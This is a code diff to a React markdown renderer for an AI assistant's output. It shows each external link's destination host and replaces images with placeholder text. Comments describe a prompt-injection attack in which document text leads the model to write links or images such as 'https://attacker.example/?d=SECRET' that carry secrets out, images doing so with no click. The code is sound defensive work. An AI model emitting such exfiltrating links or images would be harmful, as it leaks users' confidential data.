@@ -11,14 +11,19 @@ import { memo } from "react";
 // (genuine external URLs a tool returned — signing/share links); a relative
 // link or one pointing at our own origin is rendered as plain, non-clickable
 // text. Belt-and-suspenders with the prompt rule that tells it not to.
-function isExternalHref(href: string | undefined): boolean {
-  if (!href) return false;
+// Returns the destination host for an external link, else null. The host is
+// also shown next to the link text: a prompt-injected
+// [see clause](https://attacker.example/?d=SECRET) then reads
+// "see clause (attacker.example)", so a person sees where a click goes before
+// making it — the AI writes the link, the person decides to follow it.
+function externalHost(href: string | undefined): string | null {
+  if (!href) return null;
   try {
     const url = new URL(href, window.location.origin);
-    if (url.protocol !== "http:" && url.protocol !== "https:") return false;
-    return url.host !== window.location.host;
+    if (url.protocol !== "http:" && url.protocol !== "https:") return null;
+    return url.host !== window.location.host ? url.host : null;
   } catch {
-    return false;
+    return null;
   }
 }
 
@@ -27,6 +32,9 @@ function MarkdownImpl({ children }: { children: string }) {
   return (
     <div className="font-sans text-[16px] leading-[1.75] text-slate-800">
       <ReactMarkdown
+        // Never add rehype-raw: without it react-markdown renders raw HTML
+        // (iframe, video, object, img...) as text, so the only URL-bearing
+        // elements markdown can make are `a` and `img`, both handled below.
         remarkPlugins={[remarkGfm]}
         components={{
           h1: (p) => (
@@ -65,24 +73,38 @@ function MarkdownImpl({ children }: { children: string }) {
             <strong className="font-semibold text-slate-900" {...p} />
           ),
           em: (p) => <em className="italic" {...p} />,
-          a: ({ href, children, ...rest }) =>
-            isExternalHref(href) ? (
-              <a
-                href={href}
-                className="font-medium text-brand-600 underline underline-offset-2 hover:text-brand-700"
-                target="_blank"
-                // noopener prevents older browsers/embedded webviews from
-                // exposing window.opener to the destination page; noreferrer
-                // also strips the Referer header. Belt-and-suspenders.
-                rel="noopener noreferrer"
-                {...rest}
-              >
-                {children}
-              </a>
-            ) : (
+          a: ({ href, children, ...rest }) => {
+            const host = externalHost(href);
+            if (!host)
               // Fabricated in-app link → keep the text, drop the dead link.
-              <span className="font-medium text-slate-900">{children}</span>
-            ),
+              return <span className="font-medium text-slate-900">{children}</span>;
+            return (
+              <>
+                <a
+                  // rest first, so a spread prop can never override target/rel.
+                  {...rest}
+                  href={href}
+                  className="font-medium text-brand-600 underline underline-offset-2 hover:text-brand-700"
+                  target="_blank"
+                  // noopener prevents older browsers/embedded webviews from
+                  // exposing window.opener to the destination page; noreferrer
+                  // also strips the Referer header. Belt-and-suspenders.
+                  rel="noopener noreferrer"
+                >
+                  {children}
+                </a>{" "}
+                <span className="text-xs text-slate-500">({host})</span>
+              </>
+            );
+          },
+          // An image in model output is fetched the moment it renders (React
+          // even adds a preload), so its URL can carry data out with no click:
+          // contract text can prompt-inject ![x](https://evil/?d=SECRET).
+          // Nothing the assistant writes needs an image; show a placeholder (with
+          // the alt text when there is one) so nothing silently disappears.
+          img: ({ alt }) => (
+            <span className="italic text-slate-500">{alt ? `[image: ${alt}]` : "[image]"}</span>
+          ),
           blockquote: (p) => (
             <blockquote
               className="my-3 border-l-2 border-slate-300 pl-4 italic text-slate-600"
